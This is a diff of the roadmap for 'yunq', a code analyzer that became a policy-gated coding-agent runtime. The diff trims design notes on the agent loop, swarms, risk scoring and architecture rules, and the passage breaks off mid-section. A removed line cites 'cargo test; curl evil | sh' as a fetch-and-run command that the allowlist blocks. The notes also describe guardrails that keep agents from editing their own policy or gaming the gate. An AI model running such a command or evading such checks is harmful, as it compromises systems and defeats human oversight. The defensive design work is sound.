@@ -2,887 +2,103 @@
 
 > The forward-looking plan. Historical session-by-session narrative — and the
 > design rationale behind everything already built — lives in
-> [DEVLOG.md](DEVLOG.md), which this file replaced on 2026-07-29.
+> [DEVLOG.md](DEVLOG.md).
 
 ## Mission
 
 yunq began as an analyzer: *"what is wrong with this code?"*. It then became a
-guardrail: *"may this write land?"*. The next step is the one this roadmap is
-organised around — **yunq writes the code too, and is the only agent runtime
-that cannot approve its own work.**
+guardrail: *"may this write land?"*. It is now also an agent runtime:
+**yunq writes the code too, and is the only agent runtime that cannot approve
+its own work.**
 
-Every coding agent on the market grades its own homework. The model proposes
-an edit, the model decides the edit is good, and the verification is a second
-prompt to the same weights. yunq is the one project where the judge already
-exists as a separate, deterministic, 150-rule artifact that predates the
-writer. Making yunq write code is not a pivot away from analysis — it is the
-only way to close the loop that analysis was always pointing at.
+Every coding agent on the market grades its own homework. yunq is the one
+project where the judge already exists as a separate, deterministic,
+150-rule artifact that predates the writer. In `yunq agent`, no edit reaches
+disk without passing the same `core/agent-policy` evaluation that gates a
+third-party agent, and no task is reported complete without the analyzer
+agreeing.
 
-**The thesis, stated as a constraint:** in `yunq agent`, no edit reaches disk
-without passing the same `core/agent-policy` evaluation that gates a
-third-party agent today, and no task is reported complete without the
-analyzer agreeing. The referee becomes a player without ever stopping being
-the referee.
-
-## Where we actually are (2026-07-30)
-
-Verified against the tree, not remembered:
+## Where we are
 
 | Area | State |
 |---|---|
 | Workspace | Hexagonal, enforced by Cargo: `bin → {infra, parsers, rulesets} → core` |
-| Languages | 24 tree-sitter grammars (`parsers/`, plus `treesitter-adapter` + `treesitter-tokens`) |
-| Rules | 150 `Rule`/`CrossFileRule` impls across 15 ruleset crates — including the SOLID/hexagonal/DDD gatekeeper (D3, D3b, D3c), live for TypeScript, Python, Rust and Go |
-| Tests | ~1667 test functions in-workspace (`#[test]` + `#[tokio::test]`, counted directly rather than carried forward) |
-| Analysis core | `rules-engine`, `ast`, `profiles`, `taint` (intra + cross-file), `duplication`, `symbols`, `import-graph`, `crap` (CC² × (1−coverage)³ + CC risk scoring) |
-| Agent guardrail | `core/agent-policy` (1039 LOC): blocking/advisory rules, protected paths (incl. its own policy/gate config files), provenance, Gherkin evidence, circuit breaker, loop guard, single-use escalation tokens, audit log, gate-gaming detection (suppressions, skipped tests) |
-| Guardrail host | `yunq hook {claude-code, check, install, approve, audit, reset-*}` — ~7ms p50 per write |
-| Agent runtime | `core/agent` (pure: session/tool loop, closed tool set, command allowlist, in-process write gate, analyzer-as-done, budget + repeat guard, PR-feedback watch) driven by `yunq agent {run, watch-pr}`; adapters in `infra/llm` (tool-calling chat), `infra/fs` (workspace), `infra/github` (PR feedback) |
-| Remediation | `core/remediation`: `RemediationEngine` over `LlmProvider` + `Sandbox` ports, generate → sandbox → re-scan → verdict |
-| LLM adapters | `infra/llm`: Anthropic Messages API + OpenAI-compatible (Groq/DeepSeek/Ollama/vLLM/LiteLLM) |
-| CLI | `scan`, `fix`, `hook`, `agent {run, tui, watch-pr}`, `swarm`, `init`, `wizard` |
-| Agent observability | `core/agent::observer` (pure `AgentEvent`/`Observer` port, `NoopObserver` default) driving `yunq agent tui` — a spectator, not a second control path |
-| Swarm | `core/swarm` (pure: worktree-plan computation, handoff schema/validation, topology resolution) + `infra/fs::{swarm_worktree, handoff}` (git worktree lifecycle, durable file-queue) + per-role policy scoping (`AgentPolicy::with_role_scope`, `core/agent-policy`), driven by `yunq swarm {roles, worktree-*, handoff-*, run}` — `run` drives a whole `[swarm] topology`/`pipeline` through headless `yunq agent`, one role at a time, automatically |
-| Coverage ingest | LCOV, Cobertura, JaCoCo, llvm-cov, Istanbul — with per-line hit detail (`FileLineCoverage`) |
+| Languages | 24 tree-sitter grammars |
+| Rules | 150 `Rule`/`CrossFileRule` impls across 15 ruleset crates, including a hexagonal/DDD/SOLID gatekeeper for TypeScript, Python, Rust and Go |
+| Analysis core | `rules-engine`, `ast`, `profiles`, `taint` (intra + cross-file), `duplication`, `symbols`, `import-graph`, `crap` (risk = complexity² × untestedness³ + complexity) |
+| Agent guardrail | `core/agent-policy`: blocking/advisory rules, protected paths, provenance, Gherkin evidence, circuit breaker, loop guard, gate-gaming detection — hosted by `yunq hook` |
+| Agent runtime | `core/agent` (session loop, closed tool set, in-process write gate, analyzer-as-done, budget/repeat guard, PR-feedback watch) via `yunq agent {run, tui, watch-pr}` |
+| Swarm | `core/swarm` (worktree isolation, durable handoffs, per-role policy scoping, topologies) via `yunq swarm {roles, run, ...}` |
+| Remediation | `core/remediation`: generate → sandbox → re-scan → verdict |
+| CLI | `scan`, `fix`, `hook`, `agent`, `swarm`, `init`, `wizard` |
+| Coverage ingest | LCOV, Cobertura, JaCoCo, llvm-cov, Istanbul |
 | ALM adapters | GitHub, GitLab, Bitbucket, Azure DevOps |
-| CI | `.github/workflows/ci.yml` — tests, clippy, benchmark regression gate (10% throughput drop fails), mutation gate |
-| Performance | **~67.6k LOC/s** measured floor on a throttled runner; target ≥100k. The "~398k LOC/s" figure that circulated earlier is retracted — no harness ever produced it |
-| Hosted layer | `yunq-cloud`, private repo (API server, worker, Postgres, frontend) — out of scope here |
+| CI | tests, clippy, benchmark regression gate (10%), mutation gate |
+| Performance | ~67.6k LOC/s measured floor; target ≥100k |
+| Hosted layer | `yunq-cloud`, private repo — out of scope here |
 
-**The gap as of 2026-07-29 — closed as of 2026-07-30:** yunq could judge an
-edit in 7ms and could not make one. `yunq fix` proposed a single-issue patch
-and stopped. A1–A6 shipped: there is now a session, a tool loop, multi-file
-change, an in-process policy gate, an analyzer-decided definition of done,
-and a live terminal view onto a headless run. Workstream A is fully shipped.
-B1–B4 (swarm worktree isolation, durable handoffs, per-role policy scoping,
-and topologies driving several roles through headless `yunq agent`
-automatically) shipped alongside it — workstream B is now fully shipped too.
+Workstreams A (agent runtime) and B (swarm) are fully shipped. C1–C3 (CRAP),
+D1–D3 (architecture fitness: boundaries, main sequence, tactical DDD), and
+E4–E5 (gate-gaming detection) are fully shipped. What's below is what's
+actually left.
 
 ---
 
-## A. `yunq agent` — the native agent runtime
+## Open work
 
-**Decision: build natively on the existing ports. Do not fork ZeroClaw.**
-
-ZeroClaw ([zeroclaw-labs/zeroclaw](https://github.com/zeroclaw-labs/zeroclaw))
-is the closest prior art — Rust, 3–5MB, ~10ms startup, tool allowlists,
-workspace isolation, dual MIT/Apache-2.0 so a fork is legally free. It is
-still the wrong base. It is a *personal-assistant* runtime whose surface area
-is 30+ delivery channels (Discord, Telegram, Matrix, email, voice); the part
-that matters to a coding agent is its provider abstraction and tool
-allowlist, and yunq already has both (`infra/llm`, `core/agent-policy`).
-Forking would buy a session loop and pay for it with a permanent rebase tax
-against an upstream steering somewhere else entirely. Read it for its
-workspace-isolation and pairing design; write our own runtime.
-
-Pure logic in `core/agent`, composition root in `bin/cli`'s `agent` module —
-the split follows the existing rule (the loop's decision logic is pure and
-unit-testable, the I/O is the binary's problem), with one change from the
-original plan. The composition root is *not* a new `bin/agent` crate. Every
-adapter A2 needs — the policy loader, the provenance ledger, the Gherkin
-index, the approval store, the persisted circuit breaker, the audit log, the
-whole-workspace `AnalyzerService` — already exists in `bin/cli`, and a
-separate binary could only reach them by depending on `bin/cli` (making
-`yunq agent` a second executable, contradicting A6's `yunq agent run --task`)
-or by duplicating them (contradicting A2's entire point). One binary, one
-enforcement engine.
-
-- **A1 — Session + tool loop. Shipped.** `core/agent::{session, tools,
-  runtime}`. A transcript, a closed tool set (`read`, `write`, `edit`,
-  `search`, `run`, `scan`) as a Rust enum — an unrecognised name comes back
-  to the model as "no such tool", never routed — and a turn loop that
-  terminates in one of six states. `run` is narrowed twice: a
-  `CommandAllowlist` of programs, plus rejection of every shell
-  metacharacter, so `cargo test; curl evil | sh` cannot pass a check that
-  only reads the first word. Execution goes through the `Workspace` port
-  (`infra/fs::RepoWorkspace`: root-confined path resolution, killed on
-  timeout) rather than `Sandbox`, whose apply/read/rollback shape is a
-  remediation contract with no way to run a command.
-- **A2 — Policy as the referee, in-process. Shipped.** `HookWriteJudge` calls
-  the same `hook::judge` a third-party agent's write goes through, then the
-  same `track_circuit_breaker`, `track_loop_guard` and `append_audit_log`.
-  Not a second implementation of the guardrail — the same functions. The
-  runtime's own invariant is structural: `AgentRuntime::apply_write` is the
-  only function holding both a `Workspace` and a `WriteJudge`, so there is no
-  route to disk that skips the evaluation, and a judge that *fails* stops the
-  run rather than letting an unjudged write through.
-- **A3 — Analyzer as the definition of done. Shipped.**
-  `core/agent::completion`. `RemediationEngine`'s verdict lifted to task
-  scope, with two changes the wider scope forces: the comparison is against a
-  baseline taken before the run (not against zero — a real repository has
-  findings the task is not about), and a finding's identity is
-  `(file, rule, message)` as a multiset, so an edit that moves a line is not
-  a regression while a *second* copy of an existing finding is. When the
-  model stops calling tools the analyzer re-runs and, if it disagrees, its
-  objection becomes the next user turn. No self-assessment turn, ever.
-- **A4 — Cost and termination. Shipped.** `core/agent::budget`. Turn and
-  token ceilings checked before each turn, each with its own verdict; the
-  circuit breaker and a session-scoped repeat guard as stopping conditions;
-  six terminal states with six distinct exit codes (0 complete, 3 incomplete,
-  4 budget, 5 breaker, 6 looping, 1 yunq failed), so a supervisor never has
-  to parse prose and "we could not check" never reads as success.
-- **A5 — Late feedback is part of done. Shipped.** `core/agent::feedback`
-  (pure: backoff, settle window, triage ledger, classification) plus
-  `infra/github::PullRequestFeedbackReader` and `yunq agent watch-pr`. Four
-  terminal states — quiet, new feedback, bot all-clear, **inconclusive** —
-  and the last one is load-bearing: a window that ends after a failed poll,
-  or with a check still running, reports inconclusive rather than quiet.
-  Fail-open must not mean fail-blind. Every ALM call is status-checked before
-  its body is deserialised, because a rate-limit page parses into an empty
-  list and an empty list reads as silence.
-- **A6 — TUI. Shipped.** Last, deliberately — a headless `yunq agent run
-  --task` that is scriptable and CI-usable was worth more than a chat
-  interface, and it is what the swarm in workstream B drives, so it went
-  first. The TUI (`yunq agent tui`) is a spectator on that same headless
-  path, not a second one: `core/agent::observer` adds an `AgentEvent`
-  enum and an `Observer` port (`TurnStarted`, `ModelResponded`,
-  `ToolCallStarted`/`Finished`, `WriteJudged`, `Adjudicated`, `Finished`)
-  that `AgentRuntime` reports to *after* every decision it already made —
-  `Observer::on_event` returns nothing for the loop to branch on, so
-  watching a run structurally cannot change what it does. `AgentRuntime`
-  gained a `Box<dyn Observer>` field defaulting to `NoopObserver` (a
-  `with_observer` builder swaps it in), not a fifth generic parameter, so
-  none of the runtime's existing call sites or tests changed shape — only
-  `bin/cli::agent::run` gained a `run_with_observer` sibling that `run`
-  itself now delegates to. `bin/cli/src/tui.rs` renders with `ratatui` +
-  `crossterm`: an `UnboundedSender<AgentEvent>`-backed `Observer` forwards
-  events from the spawned run to a render loop polling both the channel and
-  terminal input (multi-threaded tokio, so the blocking `crossterm::event::
-  poll` never stalls the run). Quitting (`q`/`Esc`/`Ctrl-C`) detaches rather
-  than cancels — the run keeps going headless and the process still awaits
-  it to report the same exit code a non-interactive run would, because a
-  spectator leaving the room must not stop the game; verified end-to-end
-  with a real pty (`python`'s `pty.fork`), confirming raw-mode entry, a
-  live redraw loop, the detach keypress being honoured, and — critically —
-  clean terminal restoration (`LeaveAlternateScreen`, cursor shown) even
-  though the underlying run was still blocked on an unconfigured LLM
-  provider at the time. `UiState::apply` (event → what's on screen) and
-  `truncate` are pure and unit-tested directly; the terminal I/O around them
-  is not, by the same "testing dead-zone by design" convention `main.rs`'s
-  own doc comment already states for this binary.
-
-**Non-goal:** yunq agent is not a general assistant. No chat channels, no
-plugins, no MCP client. It edits repositories under a policy.
-
-## B. `yunq swarm` — multi-agent orchestration
-
-Adapted from Uncle Bob's
-[swarm-forge](https://github.com/unclebob/swarm-forge). Take the protocol,
-not the implementation: swarm-forge coordinates through tmux sessions and a
-shared `scripts/` directory on each agent's PATH, which is a shell-level
-solution to a problem yunq can solve in-process and in-binary.
-
-What transfers:
-
-- **Worktree-per-agent isolation.** One `git worktree` per agent, so
-  concurrent agents never contend on the index. Direct fit with the existing
-  `Sandbox` port, whose git-worktree adapter already exists for remediation.
-- **Durable, validated handoffs.** Files under `.yunq/handoffs/`
-  (`outbox`/`inbox`/`sent`/`failed`), not direct messaging — a crashed agent
-  loses nothing and a malformed handoff lands in `failed` instead of
-  corrupting a peer's context. yunq validates handoffs against a schema; the
-  denial DTO from `hook check --format json` is the natural payload for
-  "agent B, here is exactly why your edit was refused".
-- **Role constitutions.** Layered prompts per role (coder, architect,
-  cleaner, QA), composed over a shared base.
-
-What yunq adds that swarm-forge deliberately does not have: swarm-forge
-enforces discipline "through workflow structure rather than access controls".
-yunq has the access controls. **Roles get policy scopes** — the cleaner may
-not touch `.github/workflows/**`, the coder may not edit the ruleset that
-judges it, QA gets read + `scan` and no write at all. `protected_path` already
-expresses this; the swarm just needs per-role policy resolution.
-
-- **B1** ✅ **done.** Worktree lifecycle + role config (`yunq.toml`
-  `[swarm]` table). New pure crate `core/swarm` (`yunq-swarm`, mirroring
-  `core/agent`'s split — no filesystem, no process spawning) holds
-  `plan_worktree`: given a repo root, an optional `[swarm] worktree_root`
-  (default `.yunq/worktrees`) and a role's own overrides, it computes an
-  already-joined `WorktreePlan { path, branch }` — default branch naming is
-  `yunq/swarm/<role>`, so two roles can never collide without either
-  configuring one. `[[swarm.role]]` (`infra/fs::config`: `SwarmSettings`,
-  `RoleSettings`, `RoleProtectedPath`) follows the same
-  `#[serde(default)]`, present-key-is-an-override convention every other
-  optional `yunq.toml` table uses. The I/O half,
-  `infra/fs::swarm_worktree`, shells out to `git worktree add/remove/list`
-  (mirroring the split `infra/fs::WorktreeSandbox` already draws between
-  "a worktree exists" and "what happens inside one") and is idempotent the
-  way a swarm restarting after a crash needs: recreating a role whose
-  branch already exists attaches to it instead of failing on "branch
-  already exists". Verified against a real `git` repository (not mocked)
-  — create, list (parsing real `git worktree list --porcelain` output),
-  remove, and the attach-to-existing-branch path all round-tripped in
-  `infra/fs`'s test suite.
-- **B2** ✅ **schema + durable queue done; replay is B4's problem, not
-  this item's.** `core/swarm::handoff`: a flat, JSON-serializable
-  `Handoff { id, from_role, to_role, summary, denial, created_at }` —
-  `denial` is deliberately opaque `serde_json::Value`, the natural shape
-  for "the denial DTO from `hook check --format json`, passed through
-  unchanged" the roadmap called for, since `core/swarm` has no reason to
-  know that DTO's fields. `parse_handoff` validates required fields
-  non-empty and is the pure boundary a malformed handoff fails at — the
-  I/O half, `infra/fs::handoff`, is what acts on that failure: four
-  directories under `.yunq/handoffs/` (`outbox`/`inbox/<role>`/`sent`/
-  `failed`), every operation a read-then-rename (atomic on the same
-  filesystem, so a crash leaves a handoff in exactly one place or none),
-  and a parse failure at either `deliver` (outbox → inbox) or `inbox`
-  (an inbox read) quarantines the original bytes into `failed/` verbatim
-  rather than losing or silently dropping them. `send` files by `<id>.json`
-  and overwrites rather than duplicates on a repeated id, so a sender
-  retrying a logical handoff reuses its id instead of double-sending.
-  Verified end-to-end (send → deliver → inbox → ack, a malformed outbox
-  entry actually landing in `failed/` with its original bytes intact, a
-  double-ack after a simulated crash being a harmless no-op) plus wired
-  all the way to `yunq swarm handoff-{send,deliver,inbox,ack}` and smoke-
-  tested against a real repository. **Not attempted here:** replay
-  tooling (re-deliver everything in `failed/` after a human fixes whatever
-  produced it) — there is nothing to replay yet since nothing in this
-  session's testing produced a real malformed handoff outside the test
-  suite itself; the quarantine mechanism it would operate on is in place.
-- **B3** ✅ **done.** Per-role policy scoping, in `core/agent-policy`
-  itself rather than `core/swarm` — it needs direct access to that
-  crate's compiled `GlobSet`, which nothing outside the crate can extend.
-  `AgentPolicy::with_role_scope(&RoleScope) -> Result<AgentPolicy,
-  PolicyError>` rebuilds a new compiled policy from the union of the base
-  policy's own stored `(pattern, reason)` protected-path pairs and the
-  role's additional ones (`GlobSet` has no "add one more glob" operation,
-  so this is the only way to extend one without going back through TOML
-  text), plus the base `blocking_rules`/`escalate_rules` extended with the
-  role's own. Every field on `RoleScope` only *adds* restriction — there
-  is deliberately no way to narrow what the base policy already forbids,
-  because a role config an agent could edit to widen its own permissions
-  would reopen exactly the self-referential gap E5 already closed for the
-  base policy file itself. `bin/cli::swarm` bridges `yunq.toml`'s
-  `RoleSettings` to `RoleScope` the same way `bin/cli::architecture_config`
-  bridges `[architecture]` to `yunq_import_graph::ArchitectureConfig` —
-  every rule id validated up front (a typo in a role's `blocking_rules`
-  is a config error from `yunq swarm roles`, not a silently-inert string)
-  — and `yunq swarm roles` prints each role's resolved worktree plan
-  alongside how many protected paths/blocking/escalate rules it adds, so
-  the scope narrowing is visible without diffing a compiled policy.
-  Regression-tested that scoping twice is additive (never a reset) and
-  that the base policy object itself is left untouched by scoping a
-  derived copy.
-- **B4** ✅ **done.** `core/swarm::topology` (pure, mirroring the split
-  `worktree`/`handoff` already draw): `resolve_topology` turns `[swarm]`'s
-  either/or configuration — a named preset (`topology = "two-pack"` → coder,
-  reviewer; `"four-pack"` → architect, coder, cleaner, qa) or an explicit
-  `pipeline = [...]` role-name sequence, the latter always outranking the
-  former the same way a CLI flag outranks `yunq.toml` for `yunq agent`'s own
-  budget — into one validated, ordered role list, checked against the roles
-  actually declared under `[[swarm.role]]` so a preset naming an undeclared
-  role, an empty pipeline, a typo'd preset name, or a role listed twice is a
-  config error from `yunq swarm run` rather than a silent no-op or a stuck
-  pipeline. `bin/cli::swarm::topology_run` is the driver: for each role in
-  order, attach its worktree (idempotently — `git worktree list` first, so
-  re-running the same topology never fails on "worktree already exists" the
-  way calling `worktree-create` twice by hand still can), fold in and
-  acknowledge whatever the previous role's handoff queued, run the task under
-  that role's own `AgentPolicy::with_role_scope` narrowing loaded from *the
-  worktree's own* `yunq-policy.toml` (not the base repo's copy — a role's
-  scope should apply to what is actually on disk in its sandbox), then queue
-  a handoff summarizing the outcome for the next role. `core/agent`'s
-  `RunOutcome` already carried everything a supervisor needs (`exit_code`,
-  `describe`) — `topology_run` reuses it as-is rather than inventing a
-  parallel status type, and stops the pipeline at the first role whose run
-  doesn't complete, since handing an incomplete or failed run's baggage
-  forward would only compound whatever went wrong. This needed one seam
-  opened in `bin/cli::agent`: `run_with_observer` was hardcoded to `hook::
-  load_policy(root)`, so it grew a `run_with_policy_and_observer` sibling
-  (and `run`/`run_with_policy` conveniences over `NoopObserver`) taking the
-  policy as an argument instead — not a second implementation of the run
-  path, the same function with one more parameter, `run_with_observer` now
-  delegates to it. `yunq swarm run --task "..."` is the new CLI entry point,
-  exiting with the exit code of whichever role stopped the pipeline (or the
-  last role's `0`) — the same distinct-exit-code convention `yunq agent run`
-  already established, so a CI step or a human driving several roles gets
-  one number to branch on either way. Verified end-to-end against a real git
-  repository (not mocked): a two-role `topology = "two-pack"` config resolves
-  and lists correctly via `yunq swarm roles`; `yunq swarm run` against it
-  creates the first role's worktree, attempts its run, and — with no model
-  reachable — reports `RunOutcome::Failed`, exits `1`, and leaves the second
-  role's worktree uncreated, confirming the stop-on-non-completion behavior
-  is real and not just asserted in a unit test; an unconfigured repository
-  reports "no topology configured" rather than running nothing silently.
-
-## C. CRAP — risk as complexity × untestedness
-
-From [crap4clj](https://github.com/unclebob/crap4clj) (and its `crap4java` /
-`crap4go` siblings). Formula:
-
-```
-CRAP(f) = CC(f)² × (1 − coverage(f))³ + CC(f)
-```
-
-Bands: 1–5 low risk, 5–30 refactor candidate, 30+ complex *and* untested —
-the code that is most expensive to change and least safe to change.
-
-This is the cheapest high-value item on the roadmap because **both inputs
-already exist and have never been multiplied**. Cyclomatic complexity is in
-`rulesets/code-smells/src/complexity.rs`; per-line coverage arrives through
-five ingest formats and is already exposed as `FileLineCoverage` (1-based
-line → hit count). Per-function coverage is the intersection of a function's
-`Span` with that map — no new ingest, no new parser, no new port.
-
-- **C1** ✅ **done, as `core/crap`, not `rulesets/crap`.** Turned out `Rule`
-  cannot read "the analysis context" as this bullet originally assumed:
-  `AnalyzerService::analyze_files` returns a complete `AnalysisReport` before
-  `bin/cli` has even read a coverage file off disk (`ingest_coverage` runs
-  strictly after `scan_with_project_config`), so no `Rule::check(file, ast)`
-  call ever has coverage in scope, regardless of how the trait is extended.
-  Shipped instead as a plain algorithm crate (`yunq-crap`, mirroring
-  `core/duplication`'s role: a pure engine `AnalyzerService`/the composition
-  root invoke directly, not a `Rule` impl) plus plumbing: per-function
-  cyclomatic complexity, extracted from `rulesets/code-smells::ComplexityRule`
-  into `core/rules-engine::function_complexity` so both the existing rule and
-  the new metric share one walk, is now computed once per file inside
-  `AnalyzerService::analyze_one` and threaded onto
-  `AnalysisReport::function_complexities` the same way `structural_metrics`
-  already is (also plumbed through `CachedAnalysis`/`FileAnalysisCache` with
-  the same fail-open migration older field additions use). `bin/cli`'s
-  `crap` module calls `AnalysisReport::compute_crap_findings()` — a method on
-  the report itself, mirroring the existing `coverage_on_new_code` precedent
-  of joining two already-stored fields — right after `ingest_coverage`, and
-  folds the results into ordinary `crap:high-risk-function` issues via
-  `add_external_issues` (Major 5–30, Critical 30+), so they flow into SARIF,
-  PR decoration and the agent policy with zero new plumbing, same as the
-  gate-gaming findings did.
-- **C2** ✅ **done.** `crap_worst_score` and `crap_high_risk_functions` (count
-  scoring above the 30-point high-risk band) are ordinary measures on
-  `MEASURE_TABLE`, `None` until a coverage report is ingested. The default
-  gate now includes `crap_high_risk_functions > 0` — zero-tolerance, the same
-  treatment blocker/critical issues get, defensible because the threshold has
-  already done the filtering a raw coverage percentage can't.
-- **C3** ✅ **done.** `render_text` prints a "Risk hotspots (CRAP)" section,
-  worst score first; `--format json`'s `crap` array is the same ranked list,
-  each entry carrying the score and both inputs (`sorted_crap`,
-  `output.rs`). Left the main issue list's severity → file → line sort
-  untouched rather than overloading it with one rule's own metric — the
-  ranked list lives alongside it, not instead of it.
-- **C4** Run coverage, don't only ingest it. Today CRAP needs a report piped
-  in, which means the metric is only seen by people who already configured
-  it — the ones who need it least. Detect the project's coverage command from
-  its build files (`Cargo.toml` → `cargo llvm-cov --lcov`, `go.mod` → `go
-  test -coverprofile`, `pom.xml` → JaCoCo, `pyproject.toml` → coverage.py,
-  `package.json` → the runner's own flag) so CRAP works on first invocation.
-  Config wins over detection, and a detected command is *offered* for
-  persistence in `yunq.toml` rather than silently re-detected each run.
-  **Opt-in, always** (`--run-coverage` or explicit config): a static analyzer
-  that executes a repository's build commands on a bare `yunq scan` is a
-  footgun, and the whole value of the analyzer is that running it is safe.
-  Of the formats a survey of the ecosystem turns up, the only real ingest gap
-  is Go's native coverprofile — the other four are already in.
-
-**Design note:** a function with no coverage data must not be scored as
-0%-covered — that would make every repository without a coverage report look
-catastrophic. Absent data means the rule stays silent, matching the existing
-fail-open posture everywhere else in the codebase.
-
-## D. Architecture fitness — components, the main sequence, and a viewer
-
-From [dependency-checker](https://github.com/unclebob/dependency-checker) and
-[arch-view](https://github.com/unclebob/arch-view). This is the most
-ideologically aligned item on the list: yunq's README already claims *"the
-directory structure is the architecture"*, and yunq currently proves that
-claim with Cargo and one rule (`architecture:dependency-cycle`). Everything
-else is convention.
-
-`core/import-graph` already builds the edge set and detects cycles. What is
-missing is the layer above it: components, declared boundaries, and metrics.
-
-- **D1** ✅ **done.** `component_of` (`core/import-graph::component`) derives a
-  component from the first two directory segments of a path
-  (`core/rules-engine/src/lib.rs` → `"core/rules-engine"`) — deep enough to
-  separate crates under the same tier, shallow enough that a `src/`-nested
-  file still resolves to its crate rather than one component per
-  subdirectory. No new config: the directory structure is already the
-  input. `ImportGraph::component_edges()` collapses the existing file-level
-  edge set to component-level edges (self-edges dropped), the input D2's
-  boundary check runs against.
-- **D2** ✅ **done.** `[architecture]` in `yunq.toml`: `allowed_dependencies`
-  (once non-empty, whitelist mode — anything unlisted is a violation),
-  `forbidden_dependencies` (explicitly blocked edges, independent of
-  whitelist mode), and `exceptions` (overrides either list for a specific
-  declared edge). Matching is tier-first (`core/import-graph::boundary`):
-  a pattern with no component-name segment, e.g. `"core"`, matches every
-  component under that tier, not only one literally named `"core"` — so the
-  roadmap's own example (`core → infra` denied at write time) is one config
-  line, not one per crate. `ArchitectureSettings`/`DependencyEdgeConfig`
-  (`infra/fs::config`) are the `yunq.toml`-facing, fully-optional shape
-  (`#[serde(default)]` throughout, same fail-open convention
-  `DuplicationSettings` set); `bin/cli::architecture_config` bridges to the
-  engine-facing `yunq_import_graph::ArchitectureConfig`
-  `rulesets/architecture::BoundaryViolationRule` takes. Unlike
-  `DependencyCycleRule`, this rule carries config, so it can't live in
-  `all_cross_rules()`'s zero-config chain (nothing in that call site has
-  `yunq.toml` in scope) — `scan_with_project_config` constructs and
-  registers it itself, once per scan, only when `[architecture]` declared
-  something (an empty config registers nothing, not an always-on no-op
-  rule). Its findings are ordinary `Issue`s via the same
-  `run_cross_file_rules` fold every other cross-file rule gets, so gates,
-  SARIF, PR decoration and the agent policy see a boundary violation with
-  zero new plumbing, verified end-to-end with a real `yunq scan` against a
-  two-file TS fixture (`core → infra` forbidden, and separately an
-  allow-list catching the same edge as undeclared) — text and
-  `--format json` output both confirmed, not just the unit tests. Rust `use`
-  edges followed immediately after (below) rather than being left as a gap:
-  self-enforcing yunq's own `bin → {infra, parsers, rulesets} → core` rule
-  turned out to matter for a reason sharper than dogfooding — Cargo enforces
-  *declared* dependencies and forbids *cycles*, but nothing in Cargo stops
-  `core/rules-engine`'s `Cargo.toml` from adding `yunq-infra-fs` and
-  importing it; that compiles fine. Direction is pure convention until this
-  rule can see it. `yunq.toml` now carries `core → infra` as a real
-  `forbidden_dependencies` entry, verified against the actual tree (zero
-  findings — no core crate depends on any infra crate today) and against a
-  genuine two-crate Cargo workspace fixture with a real, compiling violation
-  (one finding, correct file/line).
-  - **Rust `use` resolution** (`core/import-graph::extract_rust_edges`,
-    `rust_path_root`) walks every `use_declaration` shape the grammar
-    produces (`scoped_identifier`, `scoped_use_list`, `use_as_clause`,
-    `use_wildcard`) down to its leftmost identifier — the crate name (or
-    `crate`/`self`/`super`, always intra-crate, skipped before ever
-    consulting anything). Resolving *that* to a directory is a genuinely
-    different problem than TS/Python's relative-specifier resolution: a
-    crate's Rust identifier has no fixed relationship to its directory
-    (`rulesets/architecture`'s package is `yunq-rules-architecture`, not
-    `yunq-rulesets-architecture`) and needs each `Cargo.toml`'s declared
-    `[package] name`, which is I/O — so it lives in `infra/fs`
-    (`discover_rust_crates`, walks the scanned root, honors `.gitignore`
-    like `discover_projects` does, skips virtual/workspace-only manifests
-    with no `[package]` table) and is passed into
-    `ImportGraph::build_with_rust_crates` as a plain
-    `HashMap<String, String>` — `core/import-graph` stays I/O-free; the
-    index is just data, built elsewhere. `BoundaryViolationRule` grew a
-    second constructor argument for it (empty for a project with no Rust,
-    same "unresolved specifier is harmless" convention as everything else);
-    `DependencyCycleRule` deliberately did **not** — a real crate-level
-    cycle can't exist in a workspace that builds at all (Cargo's own
-    dependency graph forbids it), so extending cycle detection to Rust adds
-    engineering cost for a check Cargo already subsumes, unlike boundary
-    violation, which catches something Cargo doesn't enforce at all.
-  - **Fixed, same session**: the test/production distinction above is no
-    longer a gap. `extract_rust_edges` now reuses
-    `yunq_rules_engine::test_code` (`is_test_only_path`,
-    `rust_test_module_ranges`, `in_ranges`) exactly as `core/duplication`
-    does: a standalone `tests/*.rs` file contributes no edges at all, and a
-    `#[cfg(test)] mod tests { ... }` block inside an ordinary source file is
-    excluded only for the lines inside it. `core/import-graph` picked up
-    `yunq-rules-engine` as a real (not dev) dependency to reuse this —
-    `core/remediation` already establishes core-crate-depends-on-core-crate
-    as a normal pattern here, so this isn't a new kind of edge in the
-    dependency graph.
-  - **What verifying the fix actually found, and closed the same session**:
-    re-running `core → parsers`/`core → rulesets` as forbidden against
-    yunq's own tree, both before and after the fix, produced zero findings
-    *either way* — not because the fix was unneeded, but because it exposed
-    a second, more consequential gap. `extract_rust_edges` only walked
-    `use_declaration` nodes; yunq's own codebase never actually writes
-    `use yunq_parser_typescript::...;` anywhere — every cross-crate
-    reference goes through a fully-qualified inline path instead
-    (`yunq_parser_typescript::TypeScriptParser::new()`), with no `use`
-    statement at all, so those edges were invisible regardless of the fix.
-    This has no TS/Python analogue — both require an actual
-    `import`/`from...import` before a module's names are reachable, so
-    there is no "reference without importing" path for them to miss. For
-    Rust it's real: a fully-qualified reference with no `use` is exactly as
-    valid as one with a `use`. Closed by walking `scoped_identifier` (the
-    general path-expression form — a call target, a bare reference,
-    anything) and `scoped_type_identifier` (the same thing in type
-    position — a signature, a field type) anywhere in the file, not only
-    ones rooted in a `use_declaration`, through the same
-    `rust_path_root`/test-code-exclusion logic; a single fully-qualified
-    reference nests several matching path nodes at different depths
-    (`a::b::c::new()` visits `a::b::c::new`, `a::b::c` and `a::b` in turn,
-    all resolving to the same crate) and a crate can legitimately be
-    referenced dozens of times in one file, so `push_rust_edge` dedupes by
-    `(file, target crate)` — one edge per pair is the useful unit, not one
-    per AST node or call site. Verified against a real, compiling two-crate
-    fixture with *zero* `use` statements anywhere (every reference
-    fully-qualified) — caught, correct file/line — and yunq's own tree
-    stayed at zero findings with the *entire* hexagon now declared
-    (`core`/`parsers`/`rulesets` → `infra`/`bin`, `infra` → `bin`, eight
-    forbidden pairs in `yunq.toml`, up from the one this item shipped with
-    originally), which is only a meaningful zero because this pass proved
-    the detection is no longer silently blind to how those crates are
-    actually referenced.
-  D3 (I/A metrics, main sequence) shipped on top of this component model
-  (below), and took the zero-config hexagonal and tactical-DDD rulesets with
-  it; D4 (`yunq arch` viewer) is what remains.
-- **D3** ✅ **done.** Instability / Abstractness and the main sequence, per
-  component: I = Ce/(Ca+Ce), A = abstractions / total types, D = |A+I−1|
-  (`core/import-graph::metrics` — `ComponentMetrics`, `TypeCensus`,
